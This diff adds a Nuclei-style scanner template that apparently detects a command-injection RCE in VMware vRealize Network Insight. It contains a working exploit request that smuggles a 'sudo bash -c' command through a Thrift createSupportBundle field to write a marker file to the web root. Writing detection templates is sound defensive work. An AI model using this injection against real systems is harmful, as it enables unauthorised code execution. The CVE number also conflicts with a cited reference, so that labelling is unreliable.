@@ -1,0 +1,43 @@
+id: cve-2022-31702
+info:
+  name: VMware VRealize Network Insight RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    VMware Aria Operations Networks 6.x has a command injection vulnerability in the saasresttosaasservlet component, allowing remote code execution.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2022-31702
+    - https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/
+    - https://xz.aliyun.com/t/12608
+  classification:
+    cve-id: CVE-2022-31702
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /saasresttosaasservlet/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-thrift
+        Accept: application/x-thrift
+        User-Agent: Java/THttpClient/HC
+
+        [1,"createSupportBundle",1,1,{"1":{"str":"10000"},"2":{"str":"*.tar.gz;sudo bash -c 'echo 29cefd989fde6e46 > /usr/share/nginx/www/payload_test.txt;chmod 777 /usr/share/nginx/www/payload_test.txt'"}}]
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "29cefd989fde6e46"
+        condition: and
+
+  - raw:
+      - |
+        GET /payload_test.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "29cefd989fde6e46"
+    matchers-condition: and
